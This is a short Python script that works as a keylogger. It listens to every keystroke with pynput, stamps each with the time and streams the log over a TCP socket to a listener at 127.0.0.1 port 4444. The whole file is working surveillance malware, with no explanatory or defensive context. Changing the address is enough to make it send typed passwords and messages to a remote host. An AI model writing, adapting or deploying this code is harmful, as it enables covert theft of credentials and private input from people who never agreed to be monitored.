from pynput.keyboard import Key, Listener
import os
import socket
from datetime import datetime

mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mysock.connect(('127.0.0.1', 4444))


def on_press(key):
       r = '{}\t\t{}\n'.format(key, str(datetime.now()))
       data = r.encode()
       mysock.send(data)
with Listener(on_press=on_press) as listener:
    listener.join()
